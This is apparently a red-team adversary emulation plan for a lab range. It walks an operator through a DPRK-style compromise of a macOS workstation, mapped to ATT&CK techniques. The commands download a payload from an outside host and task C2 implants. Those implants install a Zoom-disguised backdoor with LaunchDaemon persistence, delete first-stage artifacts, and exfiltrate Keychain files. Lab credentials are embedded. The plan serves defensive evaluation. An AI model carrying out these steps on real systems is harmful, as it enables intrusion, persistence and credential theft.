# DPRK Scenario Overview

Legend of symbols:

* :bulb: - callout notes
* :heavy_exclamation_mark: - extremely important note
* :arrow_right: - Switching to another session
* :o: - Disconnect from RDP
* :red_circle: - Sign out of RDP
* :camera: - take a screenshot
* :clock2: - Record timestamp
* :loud_sound: - Noise activity

---

## Step 0 - Red Setup

### :biohazard: Procedures

* Initiate an RDP session to the Kali attack host `corsair (223.246.0.70)`:

    | IP | Username | Password |
    | -------- | -------- | -------- |
    | 223.246.0.70 | op1 | Subpar-Parabola |

* In a new terminal window, start the evalsC2server, ensuring the following
handlers are enabled:

  * FULLHOUSE.DOORED
  * STRATOFEAR
  * Simple File Server

  ```bash
  cd DPRK/Resources/control_server
  sudo go build -o controlServer main.go
  sudo tar xvf handlers/stratofear/stratofear-certs.zip -C handlers/stratofear
  sudo ./controlServer -c config/dprk.yml
  ```

    | Password |
    | -------- |
    | Subpar-Parabola |

* Right-click within the terminal window and click "Split Terminal
Horizontally". Within the new terminal, change directory to the location of the
evalsC2client.py and **use this terminal for tasking implants**.

  ```bash
  cd DPRK/Resources/control_server
  ```

* :arrow_right: Initiate an RDP session to the Windows jumpbox
`spitfire (223.246.0.90)`

## Step 0 - Range Setup

* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate a VNC
session to the macOS victim workstation `hogshead (10.55.4.50)` as
`encryptpotter.net\ranrok`:

    | VNC server | Password |
    | -------- | -------- |
    | 10.55.4.50::5900 | test1234 |

  * At the macOS login screen, authenticate with the following credentials:

    | Username | Password |
    | -------- | -------- |
    | ranrok | Ladylike-Laugh |

* Open a Terminal and elevate to sudo, providing the following password when
prompted:

    ```zsh
    sudo su
    ```

    | Password |
    | -------- |
    | Ladylike-Laugh |

* Execute the following command to download the initial payload.

```bash
curl -o /usr/local/bin/start.rb  http://b0ring-t3min4l.kr/files/start.rb
```

## Step 1 - Command and Control

### :microphone: Voice Track

> [!Note]
> This plan starts after initial compromise, where the victim was compromised
> via supply chain attack resulting in execution of a malicious script in the
> elevated context

A supply chain attack results in execution of a malicious Ruby script in the
elevated context. The Ruby script performs the following actions:

* Downloads two files:
  * `/usr/local/bin/com.docker.sock` (FULLHOUSE.DOORED)
  * `/usr/local/bin/com.docker.sock.lock` (FULLHOUSE.DOORED configuration file)
* Executes FULLHOUSE.DOORED

FULLHOUSE.DOORED is a first-stage backdoor written in C++/Objective-C++. On
execution, it will load the configuration file then communicate over HTTP to
the C2 address defined in the configuration file (`http://199.88.44.44`).

### :biohazard: Procedures

* From the elevated Terminal, execute the Ruby script:

    ```zsh
    cd /usr/local/bin/
    ruby start.rb
    ```

* :arrow_right: On Kali, confirm C2 registration of FULLHOUSE.DOORED
* :camera: Screenshot the new FULLHOUSE.DOORED session registration in the C2
server output.

### :mag: Reference Code & Reporting

> :information_source: **NOTE:** Not all techniques listed in this table
directly map to evaluation substeps

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
| ----------------- | ---------------- | ---------------- | ------------------- |
| start.rb downloads FULLHOUSE.DOORED components | [start.rb](../Resources/payloads/start.rb) | T1105 Ingress Tool Transfer | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain) |
| FULLHOUSE.DOORED masquerades as Docker files | [start.rb](../Resources/payloads/start.rb) | T1036.005 Masquerading: Match Legitimate Name or Location | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain) |
| FULLHOUSE.DOORED communicates over HTTP | [comms.cpp](../Resources/FULLHOUSE.DOORED/src/comms.cpp) | T1071.001 Application Layer Protocol: Web Protocols | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain) |

## Step 2 - Persistence

### :microphone: Voice Track

Next, DPRK uses FULLHOUSE.DOORED to setup and install STRATOFEAR, the
second-stage backdoor.

DPRK uses FULLHOUSE.DOORED to download STRATOFEAR and its configuration file to
`hogshead (10.55.4.50)` as `/Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool`
and `/Library/Fonts/pingfang.ttf.md5` respectively. Then, DPRK uses FULLHOUSE.DOORED
to create a LaunchDaemon for persistence and executes the LaunchDaemon to
execute STRATOFEAR.

On execution, STRATOFEAR loads its configuration file and communicates over
HTTPS to the C2 address defined in the configuration file
(`http://199.88.44.96`).

### :biohazard: Procedures

* Task FULLHOUSE.DOORED to download STRATOFEAR to `hogshead (10.55.4.50)`:

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 2, "payload": "stratofear", "arg":"/Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool"}'
    ```

* Task FULLHOUSE.DOORED to download STRATOFEAR's configuration file to
`hogshead (10.55.4.50)`:

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 2, "payload": "pingfang.ttf.md5", "arg":"/Library/Fonts/pingfang.ttf.md5"}'
    ```

* Task FULLHOUSE.DOORED to download and create STRATOFEAR's LaunchDaemon:

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 2, "payload": "stratofear_launchd.plist", "arg":"/Library/LaunchDaemons/us.zoom.ZoomHelperTool.plist"}'
    ```

* Task FULLHOUSE.DOORED to set STRATOFEAR as executable:

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 1, "arg": "chmod 0755 /Library/PrivilegedHelperTools/us.zoom.ZoomHelperTool"}'
    ```

* Task FULLHOUSE.DOORED to execute STRATOFEAR via launchctl:

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 1, "arg": "launchctl load -w /Library/LaunchDaemons/us.zoom.ZoomHelperTool.plist"}'
    ```

* Confirm C2 registration of STRATOFEAR
* :camera: Screenshot the registration of STRATOFEAR in the C2 server
output.

### :mag: Reference Code & Reporting

> :information_source: **NOTE:** Not all techniques listed in this table
>directly map to evaluation sub-steps

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
| ----------------- | ---------------- | ---------------- | ------------------- |
| FULLHOUSE.DOORED downloads STRATOFEAR and files | [DownloadFile](../Resources/FULLHOUSE.DOORED/src/core.hpp#L63) | T1105 Ingress Tool Transfer | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain) |
| FULLHOUSE.DOORED executes commands using NSTask | [ExecuteCmd](../Resources/FULLHOUSE.DOORED/src/core.hpp#L49) | T1106 Native API | [Objective-See](https://objective-see.org/blog/blog_0x77.html) |
| FULLHOUSE.DOORED executes commands using /bin/zsh | [ExecuteCmd](../Resources/FULLHOUSE.DOORED/src/core.mm#L88) | T1059.004 Command and Scripting Interpreter: Unix Shell | [Objective-See](https://objective-see.org/blog/blog_0x77.html) |
| FULLHOUSE.DOORED creates LaunchDaemon | - | T1543.004 Create or Modify System Process: Launch Daemon | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain) |
| FULLHOUSE.DOORED set STRATOFEAR as executable via chmod | - | T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification | - |
| FULLHOUSE.DOORED executes LaunchDaemon via launchctl | - | T1569.001 System Services: Launchctl | - |
| STRATOFEAR masquerades as Zoom files | - | T1036.005 Masquerading: Match Legitimate Name or Location | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain) |
| STRATOFEAR communicates over HTTPS | [SendHTTPSRequest](../Resources/STRATOFEAR/src/implant/comms.hpp#L86) | T1071.001 Application Layer Protocol: Web Protocols | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain) |
| STRATOFEAR communicates over HTTPS | [SendHTTPSRequest](../Resources/STRATOFEAR/src/implant/comms.hpp#L86) | T1573.002 Encrypted Channel: Asymmetric Cryptography | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain) |

## Step 3 - Defense Evasion

### :microphone: Voice Track

After installing the second-stage backdoor, DPRK removes the first-stage
backdoor. FULLHOUSE.DOORED will remove its configuration file and binary on
exit.

### :biohazard: Procedures

* Task FULLHOUSE.DOORED to exit and clean itself up:

    ```bash
    ./evalsC2client.py --set-task 01A48A493AC92607E79CB427067C0A42 '{"id": 1, "arg": "rm -f com.docker.sock com.docker.sock.lock && (sleep 7 && pkill com.docker.sock ) &"}'
    ```

* :camera: Screenshot the stopped beacons from FULLHOUSE.DOORED

### :mag: Reference Code & Reporting

> :information_source: **NOTE:** Not all techniques listed in this table
directly map to evaluation substeps

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
| ----------------- | ---------------- | ---------------- | ------------------- |
| FULLHOUSE.DOORED exits and deletes its artifacts | - | T1070.004 Indicator Removal: File Deletion | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain) |

## Step 4 - Collection

### :microphone: Voice Track

Next, DPRK uses STRATOFEAR to collect system information and exfiltrate targeted
Keychain files. STRATOFEAR executes the `0x07` command which collects and posts
the users, system, and OS information to the C2 server. STRATOFEAR then
downloads a module in the form of a macOS specific dynamic library
(.dylib file, similar to a .dll file for windows) Using the `0x62` command. The
module is saved to disk with a random 6 alphanumeric character filename in the
`/tmp` folder. Using `dlopen()` & `dlsym()` API calls, the module is loaded into
STRATOFEAR's process space and executed. The module executed saves the
Keychain file paths to an environment variable. STRATOFEAR then executes the
`0x64` command which uploads files to the  C2 server using the paths saved in
the environment variables set using the dylib file. DRPK then tasks STRATOFEAR to
monitor for all devices mounted to the system using the `0x47` command.

### :loud_sound: Noise
* :arrow_right: Initiate an RDP session to the Windows jumpbox
`spitfire (223.246.0.90)`
* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate a VNC
session to the MacOS victim workstation `hogshead (10.55.4.50)`.
    | Hostname | Password |
    | -------- | -------- |
    | 10.55.4.50::5900 | test1234 |
  * At the MacOS login screen, authenticate with the following credentials:
    | Username | Password |
    | -------- | -------- |
    | ranrok | Ladylike-Laugh |
* Open Script Editor and save the following as `count_files.scpt`
    ```applescript
    tell application "Finder"
        set ffolder to choose folder
        set sccripts to every item of ffolder whose kind is not "folder"
        get count of sccripts
    end tell
    ```
* In Script Editor, click the Play ▶️ button to run the script. In the
Finder terminal to choose a folder, pick Applications
* Open Safari and browse to <https://www.jetbrains.com/idea/download/?section=mac>
to download IntelliJ. In the .dmg dropdown, select ".dmg (Apple Silicon)"
* Follow the instructions to install IntelliJ
* Once installation has completed, open IntelliJ


### :biohazard: Procedures

* Task STRATOFEAR to collect system information:

    ```bash
    ./evalsC2client.py --set-task gidle '{"id": "0x07"}'
    ```

* :camera: Screenshot the collected system information.

* Task STRATOFEAR to download and execute the Keychain module:

    ```bash
    ./evalsC2client.py --set-task gidle '{"id": "0x62", "args": "libmodule_keychain.dylib"}'
    ```

* Task STRATOFEAR to retrieve the module execution results:

    ```bash
    ./evalsC2client.py --set-task gidle '{"id": "0x64"}'
    ```

* :camera: Screenshot the C2 server output of the successful file download.

* Task STRATOFEAR to monitor for when a device is mounted to the system:

    ```bash
    ./evalsC2client.py --set-task gidle '{"id": "0x47"}'
    ```

> :fast_forward: Emulate the following legitimate user activity:
>
> * :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate a
> VNC session to the macOS victim workstation `hogshead (10.55.4.50)` as
> `encryptpotter.net\ranrok` or use the existing VNC session if one is already open.
>
>    | Hostname | Username | Password |
>    | -------- | -------- | -------- |
>    | hogshead.encryptpotter.net | encryptpotter.net\ranrok | Ladylike-Laugh |
>
> * Open Safari and navigate to <https://slack.com/downloads/mac>
>
> * Download and install Slack on the host

🛑 END OF SCENARIO

---

#### Verifying Event Monitoring

* Within the VNC to `hogshead (10.55.4.50)`, open a Terminal prompt and check
the monitoring log file:

    ```zsh
    cat /Library/Fonts/AppleSDGothicNeo.ttc.1
    ```

* :camera: Screenshot the output from the log file.

### :mag: Reference Code & Reporting

> :information_source: **NOTE:** Not all techniques listed in this table
>directly map to evaluation sub-steps

| Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
| ----------------- | ---------------- | ---------------- | ------------------- |
| STRATOFEAR uses `popen` to execute discovery commands | [core.cpp](../Resources/STRATOFEAR/src/implant/core.cpp#L132) | T1059.004 Command and Scripting Interpreter: Unix Shell | |
| STRATOFEAR uses `logname` for current user discovery | [core.cpp](../Resources/STRATOFEAR/src/implant/core.cpp#L156) | T1033 System Owner/User Discovery | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain), [SentinelOne](https://www.sentinelone.com/blog/macos-malware-2023-a-deep-dive-into-emerging-trends-and-evolving-techniques/ ) |
| STRATOFEAR uses `dscl . -list /Users \| grep -v '^_'` for users on system | [core.cpp](../Resources/STRATOFEAR/src/implant/core.cpp#L162) | T1033 System Owner/User Discovery | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain), [SentinelOne](https://www.sentinelone.com/blog/macos-malware-2023-a-deep-dive-into-emerging-trends-and-evolving-techniques/ ) |
| STRATOFEAR uses `gethostname()` for hostname discovery | [core.cpp](../Resources/STRATOFEAR/src/implant/core.cpp#L150) | T1082 System Information Discovery | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain), [SentinelOne](https://www.sentinelone.com/blog/macos-malware-2023-a-deep-dive-into-emerging-trends-and-evolving-techniques/ ) |
| STRATOFEAR uses `/usr/sbin/system_profiler SPHardwareDataType` to collect hardware information | [core.cpp](../Resources/STRATOFEAR/src/implant/core.cpp#L158) | T1082 System Information Discovery | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain), [SentinelOne](https://www.sentinelone.com/blog/macos-malware-2023-a-deep-dive-into-emerging-trends-and-evolving-techniques/ ) |
| STRATOFEAR uses `/usr/bin/sw_vers` to collect OS & build information | [core.cpp](../Resources/STRATOFEAR/src/implant/core.cpp#L160) | T1082 System Information Discovery | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain), [SentinelOne](https://www.sentinelone.com/blog/macos-malware-2023-a-deep-dive-into-emerging-trends-and-evolving-techniques/ ) |
| STRATOFEAR dynamically loads modules from C2 using the `Initialize` function with `dlopen()` & `dlsym()`. | [core.cpp](../Resources/STRATOFEAR/src/implant/core.cpp#L121) | T1129 Shared Modules | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain) |
| STRATOFEAR opens & reads the system (`/Library/Keychains/System.keychain`) & user (`/Users/user3/Library/Keychains/login.keychain-db`) Keychain files |  [comms.cpp](../Resources/STRATOFEAR/src/implant/comms.cpp#L73)  | T1555.001 Credentials from Password Stores | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain) |
| STRATOFEAR uses an `FSEventStream` to collect all shared drive activity through monitoring the `/Volumes` folder | [comms.cpp](../Resources/STRATOFEAR/src/implant/comms.cpp#L252) | T1135 Network Share Discovery | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain) |
| STRATOFEAR uses an `FSEventStream` to collect when any device (including USB or software using a `.dmg` file) is mounted to the system | [core.cpp](../Resources/STRATOFEAR/src/implant/core.cpp#L257)  | T1082 System Information Discovery | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain) |
| STRATOFEAR automates the collection of all device activity through recording all `FSEventStream` events into the `/Library/Fonts/AppleSDGothicNeo.ttc.1` file. | [core.cpp](../Resources/STRATOFEAR/src/implant/core.cpp#L182) | T1119 Automated Collection | [Mandiant](https://www.mandiant.com/resources/blog/north-korea-supply-chain) |

---

## :end: End of Execution